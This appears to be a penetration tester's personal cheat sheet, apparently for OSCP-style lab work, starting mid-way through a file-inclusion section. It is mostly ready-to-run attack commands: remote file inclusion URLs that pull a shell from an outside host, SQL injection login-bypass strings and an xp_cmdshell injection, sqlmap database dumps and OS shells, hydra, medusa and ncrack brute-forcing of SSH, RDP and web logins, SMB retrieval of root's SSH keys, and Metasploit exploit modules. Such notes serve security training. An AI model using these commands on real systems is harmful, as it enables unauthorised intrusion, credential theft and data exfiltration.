?file=https://websec.wordpress.com/shell

?file=https://websec.wordpress.com/shell.txt?

?file=https://websec.wordpress.com/shell.txt%23

(requires allow_url_fopen=On and allow_url_include=On)

?file=\\evilshare\shell.php

(bypasses allow_url_fopen=Off)


### SQL-Injection recon

Get the name and the vesion then look for exploits

- Name:
- Version:

http://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/#gref

Refer to the web application work book under SQL tab

Refer to the PWK workbook V1.3 under SQL injection

```
' or 1=1--
" or 1=1--
or 1=1--
' or 'a'='a
" or "a"="a
') or ('a'='a
'"1
devnull' or '1
```
First thing you do if you get an error message is google it and verify which sql language it could be associated with.

More tests

```
hi' or 1=1--

```
inject into forms
```

Login: hi' or 1=1--  
Pass: hi' or 1=1--  

```

inject into id=

```
http://duck/index.asp?id=hi' or 1=1--

```
### fuzzing id= with burp

fuzzing all of the fields in the new site

I fired up BurpSuite, captured the request to contact.php?id=1 and send it to Intruder.

/usr/share/wordlists/wfuzz/Injections/All_attack.txt

#### Test the SQL remote command injection with tcpdump running

start the tcpdump tool

```
Root@kali> tcpdump icmp[icmptype]=icmp-echo -vvv -s 0 -X -i any -w ping.pcap

```
Try using double quote (") if single quote (') is not working. inject the following command

```
'; exec master..xp_cmdshell 'ping *attack-station*'—

```

### sql injection to hidden form


If you must do this with a hidden field, just download the source HTML from the site, save it in your hard disk, modify the URL and hidden field accordingly. 

```

<FORM action=http://duck/Search/search.asp method=post>
<input type=hidden name=A value="hi' or 1=1--">
</FORM>
```
If luck is on your side, you will get login without any login name or password. ![image.png](attachment:image.png)





### Burp SQL manual injections

use burp intruder to inject sql from wordlists

```
/usr/share/wfuzz/wordlist/Injections
```


### SQL commands

```
mysql -u root -p

show databases;

use *database*;

select * from users;

select * from users where name = 'test' and password = '123456';

create table myexploit(line blob);

insert into myexploit values(load_file('/home/folder/1518.so'));

```

### Sql blind enumberations

```
http://*target-domain*/comment.php?id=738%20union%20select%201,2,3,4,table_name,%206%20FROM%20information_schema.tables

```


### SQLMAP

```
sqlmap -u *target-domain* --crawl=1

```

### Obtain full dump of database

```
sqlmap -u *target-damian*?id=738 --dbms=mysql --dump --threads=5


```

### SQLMAP Post injections

```
./sqlmap.py -r search-test.txt -p tfUPass

sqlmap --url='*target-domain*' --threads=10 --data="username=test*&password=test&submit= Login" --passwords

sqlmap -u http://*target-domain*/index.php --method POST --data="username=abc--&password=def&submit=+Login+" --not-string="Username or Password is invalid"

sqlmap -o -u "http://192.168.56.101:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --dump
```
### SQL map interactive shell

```
sqlmap -u http://10.11.8.94/comment.php?id=738 --dbms=mysql --os-shell
```

### SQL map cracking passwords

You may or may not know that sqlmap also has password cracking capabilities. By rerunning the dump on usernames and passwords alone, the tool can attempt to retrieve the clear text password of the machine users, not just the database users. Like so:

```
sqlmap -o -u "192.168.236.135:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords method=POST --level=3 --threads=10 --dbms=MySQL --dump

```


### Get

sqlmap -u "http://*target*/index.php?id=1" --dbms=mysql

### Crawl

sqlmap -u http://*target* --dbms=mysql --crawl=3


### Sql-login-bypass

https://xapax.gitbooks.io/security/content/sql-injections.html


1.	Open Burp-suite
2.	Make and intercept a request
3.	Send to intruder
4.	Cluster attack.
5.	Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
6.	Attack
7.	Check for response length variation


Refer to your kindle 
•	SQL Injection Attacks and Defense
•	The browser hacker handbook 

```



```


### burp SQL map Login trick


open up burp and intercept that login page with admin & admin

copy the intercepted text out and paste it into a burp-post.txt

```
sqlmap --level=5 --risk=2 -r burp-post.txt --dbs

sqlmap -o -r burp-post.txt -D Webapp --tables

sqlmap -o -r burp-post.txt -D Webapp -T Users --columns

sqlmap -o -r burp-post.txt -D Webapp -T Users -C id,username,password --dump

OR

sqlmap -o -r burp-post.txt -D Webapp -T Users --dump

sqlmap -o -r burp-post.txt -D mysql --tables

sqlmap -o -r burp-post.txt -D mysql -T user -C User,Password --dump

```

### SHELLSHOCK

https://github.com/mubix/shellshocker-pocs
ls -lah /usr/share/nmap/scripts/*shellshock*
nmap *target* -p 80 \
  --script=http-shellshock \
  --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi

### Shocker

```
nmap -sV -p- --script http-shellshock *target*

nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls *target*

ls -lh /usr/share/nmap/scripts/*shellshock*
```

### Password brute force 

If you come across a hard to enumerate host This is your go to technique find all logins and list them here and start bruteforceing

REF: to the bruteforce tab in the web pentesters workbook. 

### Cewl
create a password list with cewl

cewl www.megacorpone.com -m 6 -w  /root/mega-cewl.txt 2>/dev/null
once the password list is ready then you can create more passwords, pass it on to john the ripper for some password mangling

john --wordlist=mega-cewl.txt --rules --stdout > mega-mangled

brute force http

medusa -h admin.megacorpone.com -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30

### COMMON USER PASSWORD PROFILER (CUPP)

1.	Python cup.py -i
2.	Insert victim name and information
3.	Get wordlist in cup directory

### hydra

```
hydra -l admin -P /root/Desktop/wordlists/500-worst-passwords.txt 10.194.0.36 http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"


hydra -l admin -P passwords.lst -e ns -vV 192.168.2.10 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
```
### SSH Bruteforce

hydra -C metasploitableuserpass.txt *target* ssh

### nmap brute

nmap --script brute -Pn

### ncrack

ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://*target*

### ncrack SSH

ncrack -p 22 --user root -P 500-worst-passwords.txt *target*

### medusa SSH

medusa -u root -P 500-worst-passwords.txt -h *target* -M ssh

### burp suite brute force for HTTP logins

1. set proxy settings

2. intercept login

3. forward login

4. look at site-map

5. input username and password into fields and refresh / intercept

6. forward request and look for user= and password=

7. right click and send to intruder

8. forward request and turn off intercept

9. click intruder > positions > remove or add dollar signs > select cluster bomb from top > click payloads > set payloads 1 & 2


### ncrack RDP

ncrack -u administrator -P 500-worst-passwords.txt -p 3389 *target*

### Telnet Bruteforce

hydra -C metasploitableuserpass.txt *target* telnet

### Cracking hashes

hashcat -m 500 metasploitablehash.txt metasploitablepass.txt 

### Identify hashes

hash-identifier

if that dosn't work then download the aplication and grep hash though the files which could lead you to the type of hash

### find my hash

Ref web pentesting with kali linux kindle

### try and crack passwords

### johny
Crowbar

Burpsuite intruder

### crunch


For many more web attacks go to the web application pentesting workbook

o	Enumeration tab

## Port 110 - Pop3

https://pen-testing.sans.org/resources/papers/gcih/smtp-victim-good-time-105208

- Name:

- Version:

### NMAP pop3

nmap --script=/usr/share/nmap/scripts/pop3-brute.nse  -p 110

nmap --script=/usr/share/nmap/scripts/pop3-capabilities.nse -p 110

nmap --script=/usr/share/nmap/scripts/pop3-ntlm-info.nse -p 110

```
INSERTPOP3CONNECT
```

telnet *target* 110
USER pelle@INSERTIPADDRESS
PASS admin

or:

USER pelle
PASS admin

### List all emails

list

### Retrieve email number 5, for example

retr 9


### Port 111 - Rpcbind


rpcinfo -p *target*
```

```

### Port 135 - MSRPC

Some versions are vulnerable.



nmap *target* --script=msrpc-enum

```


```

Exploit:

msf > use exploit/windows/dcerpc/ms03_026_dcom

### PORT 137 /139 / 138 / 445 NETBIOS

nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254

nbtscan -r 10.11.1.0/24

Refer to pen testing red work book 

•	Enumeration tab

C:\>net use \\*target*\IPC*dollar_sign*”” /u: “”’

this syntac connects to hidden inter process communication (IPC*dollar_sign*)cmd.exe

C:\ Net Use \\*target*\ipc*dollar_sign* “” /u:””



### ENUM4LINUX

enum4linux -a *target*

### fuzzbunch

### Port 143 - Imap

https://pen-testing.sans.org/resources/papers/gcih/smtp-victim-good-time-105208

### Port 139/445 - SMB

ls -l /usr/share/nmap/scripts/smb*

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


nmap -v -p 139, 445 --script=smb-os-discovery *target*

nmap -v -p 139, 445 --script=smb-security-mode *target*

nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 *target*

nmap -v -p 139, 445 --script=smb-brute.nse 10.11.1.0/24

nmap -p 445 *target* --script=smb-double-pulsar-backdoor

nmap --script smb-check-vulns-nse *target*

nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p445 *target*

nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse *target* -p 445

### Enum4linux

enum4linux -a *target*

enum4linux -a

enum4linux -a -u root -v *target*

enum4linux -a -u guest -v *target* >  enum4linux

### RPCCLIENT
rpcclient -U "" *target*

    srvinfo
	
    enumdomusers
    
	getdompwinfo
    
	querydominfo
    
	netshareenum
    
	netshareenumall

### SMBClient

nmap -p445 --script=smb-enum-shares *target*

smbclient -L *target*

smbclient -L=*target*

smbclient //*target*/tmp

smbclient \\\\*target*\\tmp

smbclient \\\\*target*\\home

smbclient \\\\*target*\\ipc*dollar-sign* -U john

smbclient //INSERTIPADDRESS/ipc*dollar-sign* -U john  

smb: \> cd rootfs\/root/.ssh/

smb: \rootfs\root\.ssh\> get authorized_keys 

getting file \rootfs\root\.ssh\authorized_keys of size 405 as authorized_keys (197.7 KiloBytes/sec) (average 197.8 
KiloBytes/sec)

smb: \rootfs\root\.ssh\> ^C

root@kali:~# cat authorized_keys 

List directorys with smb

Ls

Get files

smbget -R smb://*target*/tmp

Put files

### Port 139/445 - SAMBA

enum4linux *target*

enum4linux -a -u guest -v *target*

enum4linux -a -u root -v *target*

nmap --script=smb-enum-shares.nse ip

smbclient //*target*/squirtle

smb:> cat key.txt

smb:> print key.txt

smb:\>get key.txt

cat key.txt

Ideas are below

cp /usr/share/exploitdb/platforms/linux/remote/7.pl .

perl 7.pl -t linx86 -H *target* -h 10.11.1.22

Command: -msf> search scanner/samba

use auxiliary/scanner/smb/smb_version

use exploit/multi/samba/usermap_script

searchsploit samba


### Port 161/162 UDP - SNMP


Refer to pentesting redbook tabs for SNMP

•	snmp

### onesixtyone

Onesixtyone -I livehosts.txt

root@kali:~# echo public > community

root@kali:~# echo private >> community

root@kali:~# echo manager >> community

root@kali:~# for ip in *dollar-sign*(seq 1 254);do echo 10.11.1.*dollar-sign*ip;done > ips

root@kali:~# onesixtyone -c community -i ips

### snmpwalk and snmp-check

Use snmpwalk and snmp-check to gather information about the discovered targets.

snmpwalk -c public -v1 *target*

Enumerating Windows Users:

snmpwalk -c public -v1 *target* 1.3.6.1.4.1.77.1.2.25

Enumerating Running Windows Processes:

snmpwalk -c public -v1 *target* 1.3.6.1.2.1.25.4.2.1.2

Enumerating Open TCP Ports:

snmpwalk -c public -v1 *target* 1.3.6.1.2.1.6.13.1.3

Enumerating Installed Software

snmpwalk -c public -v1 *target* 1.3.6.1.2.1.25.6.3.1.2

nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS

snmp-check -t *target*S -c public

nmap -sU --open -p 161 *target*-254 -oG mega-snmp.txt

Metasploit SNMP community scanner

Msf>search snmp

Msf>use auciliary/scanner/snmp/community


### Common community strings


public

private

community

### Port 554 - RTSP

###F Ports 1030/1032/1033/1038

Used by RPC to connect in domain network.

### Port 1433 - MSSQL

- Version:

use auxiliary/scanner/mssql/mssql_ping

### Last options. Brute force.

scanner/mssql/mssql_login

### Log in to mssql

sqsh -S *target* -U sa

### Execute commands

xp_cmdshell 'date'

go

If you have credentials look in metasploit for other modules.

### Port 1521 - Oracle

- Name:
- Version:
- Password protected:


tnscmd10g version -h *target*

tnscmd10g status -h *target*


### Port 2049 - NFS


showmount -e *target*

If you find anything you can mount it like this:

mount *target*:/ /tmp/NFS

mount -t *target*:/ /tmp/NFS


### Port 2100 - Oracle XML DB

- Name:

- Version:

- Default logins:


sys:sys

scott:tiger

Default passwords

https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

### Port 2049 - NFS

showmount -e *target*

If you find anything you can mount it like this:

mount *target*:/ /tmp/NFS

mount -t *target*:/ /tmp/NFS


### Port 3306 - MySQL


Refer to pen testing red workbook tabs for mysql commands

•	mysql

- Name:

- Version:


### sqlresp.py

Located in viper

### sqlscan.py

Located in viper

### sqltest.py

Located in viper

### mysqldefault.py

Located in viper

nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse *target* -p 3306

mysql --host=*target* -u root -p

### ABSINTH 

SQL injection tool, sops are inside the browser hacker handbook

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)

- Server:

- Scripting language:

- Apache Modules:

- IP-address:

### Port 3389 - Remote desktop

Test logging in to see what OS is running

rdesktop -u guest -p guest INSERTIPADDRESS -g 94%


### Port 443 - HTTPS

nmap -sV -p 443 --script=ssl-heartbleed *target*/24


### SSLyze.py


### openssl

Heartbleed:

### Heartbleed

sslscan *target*:443

### Port 5900 VNC

VNC blank authentication scanner

Msf>use auxiliary/scanner/vnc/vnc_none_auth



# Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

Visualize your ATTACK SURFACE based on targets information for web apps it would look like below


1.	Web Application - 
2.	Web Technologies - 
3.	Web Server - 
4.	SSH Service - 
5.	Database - 
6.	OS - 

Google “Web App Name” + hostname + server type + operating system + exploit

### NMAP Vulns


ls /usr/share/nmap/scripts/ *vuln*

Examples

```

nmap -v -p- --script=vuln script-args=unsafe=1 *target* -oX vulns-results.xml

example below

ls /usr/share/nmap/scripts/*ftp* or *http*

nmap -v -p 80 --script=http-vuln-cve2010-2861 *target*

nmap -v -p 80 --script=http-vuln-cve2011-3192 *target*-210

insert vuln scans here


```

#### Nmap Vulnerability Scanning Cont

download this package

1.	https://github.com/scipag/vulscan
2.	git clone https://github.com/scipag/vulscan.git
3.	./updateFiles.sh
4.	chmod 777 *.csv
5.	chmod 777 *.nse
6.	cp *.csv /usr/share/nmap/scripts/vulscan/
7.	cp *.nse /usr/share/nmap/scripts/vulscan/

nmap -sV --script=vulscan/vulscan.nse *target* -oX big-vuln-list.xml

### NMAP VulnScan

ls -lh /usr/share/nmap/scripts/*vuln*

nmap -sV --script=vulscan/vulscan.nse *target* -oX vulscan_vulscan_dbs.xml

***important export vulnlists to html**

xsltproc vulscan_vulscan_dbs.xml -o vulscan_IP.html

### Expliot DB scan

nmap -sS -sV --script=/usr/share/nmap/scripts/vulscan/vulscan.nse -iL ~/pwk_recon/LiveHosts.txt --script-args 
vulscandb=/usr/share/nmap/scripts/vulscan/exploitdb.csv > ~/pwk_recon/vulscan-report-nmap

### Nmap OPENVAS VulnScan

nmap -sS -sV --script=/usr/share/nmap/scripts/vulscan/vulscan.nse *target*  --script-args 

vulscandb=/usr/share/nmap/scripts/vulscan/openvas.csv

nmap -sS -sV --script=/usr/share/nmap/scripts/vulscan/vulscan.nse -iL ~/pwk_recon/LiveHosts.txt --script-args 
vulscandb=/usr/share/nmap/scripts/vulscan/openvas.csv

nmap -sV --script=openvas-otp-brute *target*

### IDENTIFY THE NETWORK INFRASTRUCTURE #2


•	Enumerate hosts
•	Finger Print Operating systems
•	Nmap -sS -O target
•	List out all vectors that can be attacked


### WEBSHAG

Ref: Web app pen testing with kali on kindle

Webshag-gui

### Skipfish

Ref: Web app pen testing with kali on kindle

### websploit

Ref: Web app pen testing with kali on kindle

### oval

Download the latest from 

http://oval.mitre.org/rep-data/index.html

the latest is vr 5.10

definitions are by platform so only get those for the specific targets

place the definitions into the OVAL directory and rename it to definitions.xml

ovaldi -m -a xml -x test.html

ref: building a virtual pen testing lab on kindle

### GetSploit

git clone https://github.com/vulnersCom/getsploit.git

cd getsploit/

./getsploit.py advanced_comment_system

python getsploit.py iweb

python getsploit.py Microsoft HTTPAPI httpd 2.0

### import your nmap scans into metasploit and search for vulns

msfdb init

db_status

workspace

workspace msfu

Creating and deleting a workspace one simply uses the ‘-a‘ or ‘-d‘ followed by the name at the msfconsole prompt.

workspace -a lab4

workspace -d lab4

Set the workspace

Msf>db_import my.xml

Or redo the scans from inside msf workspace

Msf>db_nmap -n -A target

Review services

Msf> services

Msf > search services

### w3af

w3af-gui

### Tamper data

### Exploiting  email systems

Ref: building a virtual pen testing labs for advanced pen tester kindle

There is a decent write-up connecting and sending an email

### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

site:exploit-db.com apache 2.4.7

Get out the old google hacking guide in your drop box and research the target. 

### Searchsploit examples with grep

searchsploit slmail

locate /643.c

head 643.c

look at hardcoded ip addresses or username and password within exploit

### Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'

searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

### Only search the title (exclude the path), add the -t

searchsploit -t Apache | grep -v '/dos/'

more examples

searchsploit --colour -t php 5.x | grep -v '/dos/' | grep -vi '\.php'

searchsploit --colour -t php 5.x | grep -v '/dos/' | grep -vi '\.php '

Useful CVE sites:


- CVE lookup - https://www.cvedetails.com/vendor.php (Great to see an overview)

- CVE information - https://www.cvedetails.com/cve/[CVE]

- CVE information - http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]

- CVE information - https://web.nvd.nist.gov/view/vuln/detail?vulnId=[CVE]

- Depending on the site of the software, it may also be tracking CVEs on its own page (and often has a lot more information about the issue) - e.g. https://security-tracker.debian.org/tracker/[CVE]

- CVE sources - https://cve.mitre.org/data/refs/index.html

- Open source vulnerability database project (OSVDP

- Packetstorm

- Injector http://1337day.com

- http://www.db-exploit.com

- Use metasploit to search for exploits with “search samba”

- Use metasploit to search for exploits

- Use other tools databases to search for exploits



### To try - List of possibly

Add possible exploits here:

Useful tools: vFeed, searchsploit, shodan,exploitdb

### List out the exploits with the highest chance of success


```
List Vulns

```
